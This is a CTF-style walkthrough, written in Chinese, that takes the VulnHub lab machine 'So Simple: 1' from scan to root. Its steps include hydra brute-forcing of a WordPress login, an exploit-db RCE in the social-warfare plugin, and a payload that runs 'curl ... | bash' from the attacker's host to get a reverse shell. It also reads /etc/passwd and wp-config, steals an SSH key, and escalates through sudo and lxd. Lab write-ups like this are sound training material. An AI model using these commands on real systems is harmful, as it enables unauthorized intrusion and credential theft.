# So Simple: 1

2024-5-20 https://www.vulnhub.com/entry/so-simple-1,515/

difficulty: Intermediate

## IP

192.168.5.30

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 5b5543efafd03d0e63207af4ac416a45 (RSA)
|   256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA)
|_  256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: So Simple
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

看看 80 web 上有什么信息，默认主页是 apache，使用 gobuster 进行扫描：

```
gobuster dir -u http://192.168.5.30/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e

http://192.168.5.30/wordpress
```

扫描出个 wordpress，继续扫：

```
http://192.168.5.30/wordpress/wp-content           (Status: 301) [Size: 327] [--> http://192.168.5.30/wordpress/wp-content/]
http://192.168.5.30/wordpress/index.php            (Status: 301) [Size: 0] [--> http://192.168.5.30/wordpress/]
http://192.168.5.30/wordpress/license.txt          (Status: 200) [Size: 19915]
http://192.168.5.30/wordpress/wp-login.php         (Status: 200) [Size: 5210]
http://192.168.5.30/wordpress/wp-includes          (Status: 301) [Size: 328] [--> http://192.168.5.30/wordpress/wp-includes/]
http://192.168.5.30/wordpress/readme.html          (Status: 200) [Size: 7278]
http://192.168.5.30/wordpress/wp-trackback.php     (Status: 200) [Size: 135]
http://192.168.5.30/wordpress/wp-admin             (Status: 301) [Size: 325] [--> http://192.168.5.30/wordpress/wp-admin/]
http://192.168.5.30/wordpress/wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.5.30/wordpress/wp-login.php?action=register]
```

使用 wpscan 搜集用户名：

```
wpscan --url http://192.168.5.30/wordpress/ -e u
```

发现用户：admin 和 max

尝试使用 wpscan 进行用户登陆爆破：

```
hydra -t 20 -L user.txt -P ~/tools/dict/rockyou.txt 192.168.5.30 -f http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.5.30%2Fwordpress%2Fwp-admin%2F&testcookie=1:F=is incorrect"
```

找到了 max 的密码:opensesame,但是进入系统后，是个低权限用户，没有办法写入 web shell，只能尝试其他方向。

发现了 2 个 wp 插件：simple-cart-solution Version: 0.2.0 和 social-warfare Version: 3.5.0，看看这 2 个插件有没有漏洞，版本都比较老。

http://192.168.5.30/wordpress/wp-content/plugins/simple-cart-solution/

http://192.168.5.30/wordpress/wp-content/plugins/social-warfare/

发现 social-warfare 有一个 RCE 漏洞，https://www.exploit-db.com/exploits/46794，尝试进行利用：

```
python2 46794.py --target http://192.168.5.30/wordpress/ --payload-uri http://192.168.5.3/payload.txt
```

其中，http://192.168.5.3/payload.txt 为在本地搭建的 web，内容为：

```
<pre>system('cat /etc/passwd')</pre>
```

得到了目标系统的/etc/passwd 文件内容：

```
root:x:0:0:root:/root:/bin/bash
max:x:1000:1000:roel:/home/max:/bin/bash
steven:x:1001:1001:Steven,,,:/home/steven:/bin/bash
```

下面进行 shell 反弹，修改 payload.txt 内容为：

```
<pre>system('curl http://192.168.5.3/5.3/8888.sh | bash')</pre>
```

kali 上监听 8888 端口，执行后，得到了反弹的 shell：

```
www-data@so-simple:/var/www/html/wordpress/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

先升级下 tty，目标系统没有 python，直接使用 script /dev/null -qc /bin/bash 进行升级。

进行系统枚举。

查看 wp 的数据库配置文件，得到连接数据库的密码：

```
www-data@so-simple:/var/www/html/wordpress$ cat wp-config.php

define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', 'password' );
define( 'DB_HOST', 'localhost' );
```

这个密码好像暂时没什么用。

在/home/max 目录发现(被嘲笑了)，都是兔子洞：

```
www-data@so-simple:/home/max$ cat personal.txt
SGFoYWhhaGFoYSwgaXQncyBub3QgdGhhdCBlYXN5ICEhISA=   --> Hahahahaha, it's not that easy !!!

www-data@so-simple:/home/max$ cat this/is/maybe/the/way/to/a/password/password.txt
Haha, you wish!! :)

www-data@so-simple:/home/max$ cat this/is/maybe/the/way/to/a/rabbit_hole/rabbit-hole.txt

www-data@so-simple:/home/max$ cat this/is/maybe/the/way/to/a/private_key/id_rsa
```

.ssh 目录发现私钥：

```
www-data@so-simple:/home/max/.ssh$ cat id_rsa
```

保存到本地，chmod 600 ,然后使用私钥登陆：

```
chmod 600 id_rsa
ssh -i id_rsa max@192.168.5.30
```

得到了第一个 flag：

```
max@so-simple:~$ cat user.txt
073dafccfe902526cee753455ff1dbb0
```

sudo 发现：

```
(steven) NOPASSWD: /usr/sbin/service
```

进行利用,得到了 steven 权限：

```
sudo -u steven service ../../bin/sh

$ id
uid=1001(steven) gid=1001(steven) groups=1001(steven)
```

得到了 user2.txt:

```
$ cat user2.txt
b662b31b7d8cb9f5cdc9c2010337f9b8
```

最后一个 flag 应该是在 root 目录中，sudo 查看 steven 有哪些特权：

```
(root) NOPASSWD: /opt/tools/server-health.sh
```

/opt/tools/server-health.sh 文件不存在，我们可以自己创建，然后切换到 root 用户:

```
$ mkdir -p /opt/tools/
$ echo '/bin/bash' > /opt/tools/server-health.sh
$ chmod +x /opt/tools/server-health.sh
```

执行后最终得到 root 权限，并获取了第三个 flag：

```
$ sudo -u root /opt/tools/server-health.sh
root@so-simple:/home/steven# id
uid=0(root) gid=0(root) groups=0(root)
root@so-simple:/home/steven# cd /root
root@so-simple:~# ls
flag.txt  snap
root@so-simple:~# cat flag.txt


  /$$$$$$                                                     /$$              /$$
 /$$__  $$                                                   | $$             | $$
| $$  \__/  /$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$  /$$$$$$  /$$$$$$$$| $$
| $$       /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$|____  $$|_  $$_/ |____ /$$/| $$
| $$      | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/ /$$$$$$$  | $$      /$$$$/ |__/
| $$    $$| $$  | $$| $$  | $$| $$  | $$| $$      /$$__  $$  | $$ /$$ /$$__/
|  $$$$$$/|  $$$$$$/| $$  | $$|  $$$$$$$| $$     |  $$$$$$$  |  $$$$//$$$$$$$$ /$$
 \______/  \______/ |__/  |__/ \____  $$|__/      \_______/   \___/ |________/|__/
                               /$$  \ $$
                              |  $$$$$$/
                               \______/
 /$$     /$$                  /$$                                                                           /$$
|  $$   /$$/                 | $/                                                                          | $$
 \  $$ /$$//$$$$$$  /$$   /$$|_//$$    /$$ /$$$$$$         /$$$$$$  /$$  /$$  /$$ /$$$$$$$   /$$$$$$   /$$$$$$$
  \  $$$$//$$__  $$| $$  | $$  |  $$  /$$//$$__  $$       /$$__  $$| $$ | $$ | $$| $$__  $$ /$$__  $$ /$$__  $$
   \  $$/| $$  \ $$| $$  | $$   \  $$/$$/| $$$$$$$$      | $$  \ $$| $$ | $$ | $$| $$  \ $$| $$$$$$$$| $$  | $$
    | $$ | $$  | $$| $$  | $$    \  $$$/ | $$_____/      | $$  | $$| $$ | $$ | $$| $$  | $$| $$_____/| $$  | $$
    | $$ |  $$$$$$/|  $$$$$$/     \  $/  |  $$$$$$$      | $$$$$$$/|  $$$$$/$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$
    |__/  \______/  \______/       \_/    \_______/      | $$____/  \_____/\___/ |__/  |__/ \_______/ \_______/
                                                         | $$
 /$$ /$$$$$$                   /$$$$$$  /$$              | $$       /$$          /$$
| $//$$__  $$                 /$$__  $$|__/              |__/      | $$         | $/
|_/| $$  \__/  /$$$$$$       | $$  \__/ /$$ /$$$$$$/$$$$   /$$$$$$ | $$  /$$$$$$|_/
   |  $$$$$$  /$$__  $$      |  $$$$$$ | $$| $$_  $$_  $$ /$$__  $$| $$ /$$__  $$
    \____  $$| $$  \ $$       \____  $$| $$| $$ \ $$ \ $$| $$  \ $$| $$| $$$$$$$$
    /$$  \ $$| $$  | $$       /$$  \ $$| $$| $$ | $$ | $$| $$  | $$| $$| $$_____/
   |  $$$$$$/|  $$$$$$/      |  $$$$$$/| $$| $$ | $$ | $$| $$$$$$$/| $$|  $$$$$$$
    \______/  \______/        \______/ |__/|__/ |__/ |__/| $$____/ |__/ \_______/
                                                         | $$
                                                         | $$
                                                         |__/

Easy box right? Hope you've had fun! Show me the flag on Twitter @roelvb79
```

另外注意到，max 用户在 lxd 用户组，可以用 lxc 进行提权,可以用下面这个链接中的方法进行利用：https://www.hackingarticles.in/lxd-privilege-escalation/

访问 https://github.com/saghul/lxd-alpine-builder，将 alpine-v3.13-x86_64-20210218_0139.tar.gz 下载到目标机器 /tmp 目录中。

找到 lxc 的文件位置：

```
find / -name lxc 2>/dev/null

/snap/lxd/16100/bin/lxc
/snap/lxd/16100/commands/lxc
/snap/lxd/16100/lxc
/snap/lxd/16044/bin/lxc
/snap/lxd/16044/commands/lxc
/snap/lxd/16044/lxc
/snap/bin/lxc
/usr/share/bash-completion/completions/lxc
```

利用 /snap/bin/lxc 执行命令，导入镜像：

```
/snap/bin/lxc image import /tmp/alpine-v3.13-x86_64-20210218_0139.tar.gz --alias lxcimage

/snap/bin/lxc image list

/snap/bin/lxc init lxcimage ignite -c security.privileged=true  # 这句话执行时会报错，提示先创建pool，就按照下面代码继续执行

/snap/bin/lxc storage create pool dir
/snap/bin/lxc profile device add default root disk path=/ pool=pool
/snap/bin/lxc init lxcimage ignite -c security.privileged=true
/snap/bin/lxc config device add ignite trenches disk source=/ path=/mnt/root recursive=true
/snap/bin/lxc start ignite
/snap/bin/lxc exec ignite /bin/sh
```

执行完毕后，/mnt/root 目录中将挂载宿主机的全部文件，我们可以直接进入/mnt/root/root 目录查看 flag 信息。
